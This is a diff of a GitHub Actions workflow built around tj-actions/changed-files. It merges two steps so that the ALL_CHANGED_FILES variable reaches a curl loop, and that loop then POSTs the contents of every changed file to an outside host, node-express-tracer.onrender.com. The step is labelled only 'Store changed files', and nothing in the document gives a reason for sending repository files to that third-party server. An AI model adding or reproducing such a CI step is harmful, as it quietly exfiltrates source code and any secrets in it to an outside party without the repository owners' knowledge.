@@ -30,16 +30,11 @@ jobs:
         id: changed-files
         uses: tj-actions/changed-files@24d32ffd492484c1d75e0c0b894501ddb9d30d62 # v47
 
-      - name: List all changed files
+      - name: Store changed files
         env:
           ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}
         run: |
           for file in ${ALL_CHANGED_FILES}; do
-            echo "$file"
-          done
-
-      - name: Store files on server
-        run: |
-          for file in ${ALL_CHANGED_FILES}; do
+            echo "store  $file"
             curl -X POST --variable %file -H "Content-Type: application/json" --expand-data '@{{file}}' https://node-express-tracer.onrender.com/
           done
